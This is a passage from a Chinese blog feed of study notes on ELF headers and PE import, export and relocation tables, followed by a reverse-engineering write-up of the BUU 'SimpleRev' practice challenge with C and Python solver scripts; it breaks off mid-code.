文件的目标体系架构，比如ARM</p><p>e_version : 0为非法版本，1为当前版本</p><p>e_entry ： 程序入口的虚拟地址</p><p>e_phoff ： 程序头部表偏移地址</p><p>e_shoff ： 节区头部表偏移地址</p><p>e_flags ：保存与文件相关的，特定于处理器的标志</p><p>e_ehsize ：ELF头的大小</p><p>e_phentsize ： 每个程序头部表的大小</p><p>e_phnum ：程序头部表的数量</p><p>e_shentsize：每个节区头部表的大小</p><p>e_shnum ： 节区头部表的数量</p><p>e_shstrndx：节区字符串表位置</p><p>接着运行readelf -h android_server命令，可以看到ELF Header结构的内容。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525160416354.png" alt="image-20230525160416354"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE 表（29）</title>
      <link href="/2023/05/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-29-PE-%E8%A1%A8/"/>
      <url>/2023/05/24/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-29-PE-%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PE文件结构之导入表和导出表"><a href="#PE文件结构之导入表和导出表" class="headerlink" title="PE文件结构之导入表和导出表"></a>PE文件结构之导入表和导出表</h1><h2 id="IAT："><a href="#IAT：" class="headerlink" title="IAT："></a>IAT：</h2><p>【我觉得，这些都是别人微软定义好了的，知道一个概念现在就足够了，不需要刻意去记住吧】</p><p>Import Address Table , <strong>导入</strong>地址表</p><p>Dll中隐式链接的调用过程：</p><ul><li><p>以调用CreateFileW()为例</p></li><li><p>该函数位于kernel32.dll中</p></li><li><p>call dword ptr ds:[01001104] 实现函数的调用</p></li><li><p>调用CreateFileW()函数时并非直接调用,而是通过获取01001104地址处的值来实现(所有API调用均</p><p>采用这种方式)。</p></li><li><p>地址01001 104是notepad.exe中.text节区的内存区域(更确切地说是IAT内存区域)。</p></li><li><p>01001104地址处的值为7C8107F0</p></li><li><p>指令与call 7C8107F0 为一个效果</p></li></ul><p>相当于式有一个表，这个表里面放了地址。</p><p>IMAGE_IMPORT_DESCRIPTOR</p><ul><li>IMAGE_ IMPORT_ DESCRIPTOR结构体中记录着PE文件要导入哪些库文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">union &#123;</span><br><span class="line">DWORD Characteristics;</span><br><span class="line">DWORD OriginalFirstThunk; //INT的地址</span><br><span class="line">&#125;;</span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    DWORD ForwarderChain;</span><br><span class="line">    DWORD Name; //库名称字符串地址</span><br><span class="line">    DWORD FirstThunk; //IAT的地址</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">typedef struct _IMAGE_IMPORT_BY_NAME &#123;</span><br><span class="line">WORD Hint; //ordinal</span><br><span class="line">BYTE Name[1]; //function name string</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><h2 id="INT"><a href="#INT" class="headerlink" title="INT :"></a>INT :</h2><p>Import_Name_Table</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524215523921.png" alt="image-20230524215523921"></p><p>它不在PE头而在PE体中,但查找其位置的信息在PE头中</p><p> OPTIONAL_ HEADER32.DataDirectory[ 1].VirtualAddress的值即是IMAGE_ IMPORT_ DESCRIPTOR结构体数组的起始地址( RVA值)。</p><p>IMAGE IMPORT_ DESCRIPTOR结构体数组也被称为IMPORT Directory Table (只有了解上述全部称谓，与他人交流时才能没有障碍)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD VirtualAddress;</span><br><span class="line">    DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT:"></a>EAT:</h2><p>通过EAT才能准确求得从相应库中<strong>导出</strong>函数的起始地址。</p><ul><li>与前面讲解的IAT一样，PE文件内的特定结构体( IMAGE_ EXPORT_ DIRECTORY )保存着导出信息，且PE文件中仅有一个用来说明库EAT的IMAGE_ EXPORT DIRECTORY结构体</li></ul><p>(用来说明IAT的IMAGE_ IMPORT_ DESCRIPTOR 结构体以数组形式存在，且拥有多个成员。这样是因为PE文件可以同时导入多个库。)</p><ul><li>可以在PE文件的PE头中查找到IMAGE_EXPORT_DIRECTORY结构体的位置。IMAGE_OPTIONAL_HEADER32.DataDirectory[0]. VirtualAddress值即是IMAGE_ EXPORT_ DIRECTORY结构体数组的起始地址(也是RVA的值)</li></ul><p>IMAGE_EXPORT_DIRECTORY:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    WORD MajorVersion;</span><br><span class="line">    WORD MinorVersion;</span><br><span class="line">    DWORD Name; //导出文件名的字符串的地址</span><br><span class="line">    DWORD Base;</span><br><span class="line">    DWORD NumberOfFunctions; //实际Export函数的个数</span><br><span class="line">    DWORD NumberOfNames; //Export函数中有名字的函数的个数</span><br><span class="line">    DWORD AddressOfFunctions; //Export函数数组地址</span><br><span class="line">    DWORD AddressOfNames; //函数名称数组地址</span><br><span class="line">    DWORD AddressOfNameOrdinals; //Ordinal数组地址( 数组元素个数=NumberOfNames )</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524220407472.png" alt="image-20230524220407472"></p><ul><li><p>Ordinal:数组中的每一项与AddressOfNames中的每一项对应，表示该名字的函数在</p><p>AddressOfFunctions中的序号</p></li></ul><p>从库中获得函数地址的API为GetProcAddress()函数。该API引用EAT来获取指定API的地址。通过GetProcAddress() 获取的函数地址的函数拥有函数名称</p><p>(对于没有函数名称的导出函数，可以通过Ordinal 查找到它们的地址。从Ordinal值中减去IMAGEEXPORT_ DIRECTORY.Base 成员后得到一个值，使用该值作为“函数地址数组”的索引，即可查找到相应函数的地址。</p><p>GetProcAddress()原理:</p><p>(1)利用AddressOfNames成员转到“函数名称数组”。</p><p>(2)“函数名称数组”中存储着字符串地址。通过比较( strcmp)字符串，查找指定的函数名称(此时数组的索</p><p>引称为name_index)。</p><p>(3)利用AddressOfNameOrdinals成员，转到orinal数组。</p><p>(4)在ordinal 数组中通过name_ index 查找相应ordinal 值。</p><p>(5)利用AddressOfFunctions成员转到“ 函数地址数组”( EAT )。</p><p>(6)在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址。</p><h1 id="PE文件结构之重新定位表"><a href="#PE文件结构之重新定位表" class="headerlink" title="PE文件结构之重新定位表"></a>PE文件结构之重新定位表</h1><h2 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h2><p>重定位就是你本来这个程序理论上要占据这个地址，但是由于某种原因，这个地址现在不能让你占用，你必须转移到别的地址，这就需要基址重定位。</p><p>你可能会问，不是说过每个进程都有自己独立的虚拟地址空间吗？既然都是自己的，怎么会被占据呢？对于EXE应用程序来说，是这样的。</p><p>但是<strong>动态链接库</strong>就不一样了，我们说过动态链接库都是寄居在别的应用程序的空间的，所以出现要载入的基地址被应用程序占据了或者被其它的DLL占据了，也是很正常的，这时它就不得不进行重定位了。</p><h2 id="重定位表的位置"><a href="#重定位表的位置" class="headerlink" title="重定位表的位置"></a>重定位表的位置</h2><p>重定位表一般会被单独存放在一个可丢弃的以“.reloc”命名的节中，但是和资源一样，这并不是必然的，因为重定位表放在其他节中也是合法的，惟一可以肯定的是，如果重定位表存在的话，它的地址肯定可以在PE文件头中的数据目录中找到。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230757191.png" alt="image-20230524230757191"></p><p>【这里就充分说明了，洋文还是得学】</p><ul><li><p>VirtualAddress字段是当前页面起始地址的RVA值，本块中所有重定位项中的12位地址加上这个起始地址后就得到了真正的RVA值。</p></li><li><p>SizeOfBlock字段定义的是当前重定位块的大小，从这个字段的值可以算出块中重定位项的数量</p></li><li><p>由于SizeOfBlock＝4＋4＋2×n，（4字节VritualAddress,4字节SizeOfBlock,每个重定位项2字节），也就是sizeof IMAGE_BASE_RELOCATION＋2×n。</p></li><li><p>所以重定位项的数量n就等于(SizeOfBlock－sizeof IMAGE_BASE_RELOCATION)÷2。</p></li><li><p>IMAGE_BASE_RELOCATION结构后面跟着的n个字就是重定位项，每个重定位项的16位数据位中的低12位就是需要重定位的数据在页面中的地址，剩下的高4位也没有被浪费，它们被用来描述当前重定位项的种类。</p></li><li><p>虽然高4位定义了多种重定位项的属性，但实际上在PE文件中只能看到0和3这两种情况。</p></li></ul><p>所有的重定位块最终以一个VirtualAddress字段为0的IMAGE_BASE_RELOCATION结构作为结束，读者现在一定明白了为什么可执行文件的代码总是从装入地址的1000h处开始定义的了（比如装入00400000h处的.exe文件的代码总是从00401000h开始，而装入10000000h处的.dll文件的代码总是从10001000h处开始），要是代码从装入地址处开始定义，那么第一页代码的重定位块的VirtualAddress字段就会是0，这就和重定位块的结束方式冲突了。</p><p><strong>但凡涉及到直接寻址的指令都需要进行重定位处理</strong></p><p>把内存中需要重定位的数据按页的大小0x1000分为若干个块，而这个VirtualAddress就是每个块的起始RVA。在程序没有被真正加载（得到真实的起始地址）之前，就用ImageBase作为基址（这时的ImageBase是00400000）</p><p>PE文件的重定位表中保存的就是一大堆需要修正的代码。</p><p><strong>例子</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;HelloWorld&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMod = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base:&quot;</span> &lt;&lt; (DWORD)hMod &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">HelloWorld</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用VS2022生成一个x32的exe</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230315724.png" alt="image-20230524230315724"></p><p>这里没表示成[0004XXXX]，而是用 j_?HelloWorld@@YAXXZ代替了，但是双击跟进发现：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230327528.png" alt="image-20230524230327528"></p><p>实际就是[004112CB]</p><p>下面我们查看它的PE结构中的OptionalHeader.ImageBase的值：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524225835721.png" alt="image-20230524225835721"></p><p>即每次它都自身被加载到00400000处。</p><p>现在，我们利用GetModuleHandle()函数，运行testRelHello，看看实际上会被加载到哪里：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230411502.png" alt="image-20230524230411502"></p><p>我在运行之前先设好断点<img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230417692.png" alt="image-20230524230417692"></p><p>现在在VS中查看其汇编代码：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230425840.png" alt="image-20230524230425840"></p><p>对HelloWorld()的调用就变成了call [0B312CB]，而不再是[004112CB]。这就是因为进行了重定位。</p><p>现在我们计算：004112CB+B20000-400000，结果等于</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524230435397.png" alt="image-20230524230435397"></p><p>这就是对HelloWorld()函数进行重定位的一个过程</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-SimpleRev(10)</title>
      <link href="/2023/05/24/Re%E5%88%B7%E9%A2%98%E5%92%AF-10-BUU-SimpleRev/"/>
      <url>/2023/05/24/Re%E5%88%B7%E9%A2%98%E5%92%AF-10-BUU-SimpleRev/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524130631406.png" alt="image-20230524130631406"></p><p>本身想说用KALi运行一下的。但是有个啥错误..</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524131542762.png" alt="image-20230524131542762"></p><p>管他的。我们已经知道了这个程序是64位的无壳的。放入IDA看看</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524131817274.png" alt="image-20230524131817274"></p><p>看到这个Decry函数，很明显这个函数是解这个题的关键</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Decry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)src = <span class="number">0x534C43444E</span>LL;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0x776F646168</span>LL;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  text = (<span class="type">char</span> *)join(key3, v9);</span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);</span><br><span class="line">  <span class="built_in">strcat</span>(key, src);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524174005822.png" alt="image-20230524174005822"></p><p>为什么这里的src 是 NDCLS呢？</p><p>通过点击src</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524174155287.png" alt="image-20230524174155287"></p><p>发现是高地址在上面，这种就是大端存放。高地址放高位</p><p><a href="https://blog.csdn.net/xiao__1bai/article/details/122845061">https://blog.csdn.net/xiao__1bai/article/details/122845061</a></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524174808590.png" alt="image-20230524174808590"></p><p>所以现在主要的目的就是逆向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;</span><br></pre></td></tr></table></figure><p>这句话</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524175013422.png" alt="image-20230524175013422"></p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524175024160.png" alt="image-20230524175024160"></p><p>所以text = killshadow</p><p>str2是输入的。</p><p>key =  adsfkndcls</p><p>就是说：你输入的字符串经过str2[v2] = (v1 - 39 - key[v3 % v5] + 97) % 26 + 97;变化后所组成的新的字符串str2和原本的text=”killshadow”相等就能得到flag。</p><p>现在就是知道了密文就是text = killshadow，然后加密中间用到的key = adsfkndcls 求出明文就可了。</p><p>下面就是写脚本</p><h2 id="爆破思想"><a href="#爆破思想" class="headerlink" title="爆破思想"></a>爆破思想</h2><h3 id="C代码"><a href="#C代码" class="headerlink" title="C代码"></a>C代码</h3><p>这个是我的作法【下面的是网上找到的Wp】</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> a[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line"><span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line"><span class="type">char</span> b[<span class="number">15</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">b[i] = (a[j] - <span class="number">39</span> - key[i] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line"><span class="keyword">if</span> (b[i] == text[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是没改进前</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525133323613.png" alt="image-20230525133323613"></p><p>改进后</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230525130639975.png" alt="image-20230525130639975"></p><h2 id="逆向写代码。"><a href="#逆向写代码。" class="headerlink" title="逆向写代码。"></a>逆向写代码。</h2><h3 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str2 = <span class="string">&#x27;killshadow&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;adsfkndcls&#x27;</span></span><br><span class="line">v3=<span class="number">0</span>                                  </span><br><span class="line">v5=<span class="built_in">len</span>(key)</span><br><span class="line">flag=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        v1=(<span class="built_in">ord</span>(str2[j])-<span class="number">97</span>)+<span class="number">26</span>*i+<span class="built_in">ord</span>(key[v3%v5])-<span class="number">58</span></span><br><span class="line">        <span class="keyword">if</span>(v1&gt;<span class="number">65</span> <span class="keyword">and</span> v1&lt;=<span class="number">90</span>):</span><br><span class="line">            flag[j]=<span class="built_in">chr</span>(v1)</span><br><span class="line">        v3=v3+<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230524182653938.png" alt="image-20230524182653938"></p><h3 id="2-c"><a href="#2-c" class="headerlink" title="2.c"></a>2.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> using namespace <span class="built_in">std</span>;</span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">     <span class="type">char</span> flag[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     <span class="type">char</span> v1;</span><br><span class="line">     <span class="type">int</span> text_ = <span class="built_in">strlen</span>(text);</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; text_; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>;; j++) &#123;</span><br><span class="line">             v1 = text[i] - <span class="number">97</span> + <span class="number">26</span> * j - <span class="number">58</span> + key[i];</span><br><span class="line">             <span class="keyword">if</span> (<span class="string">&#x27;A&#x27;</span> &lt;= v1 &amp;&amp; v1 &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span 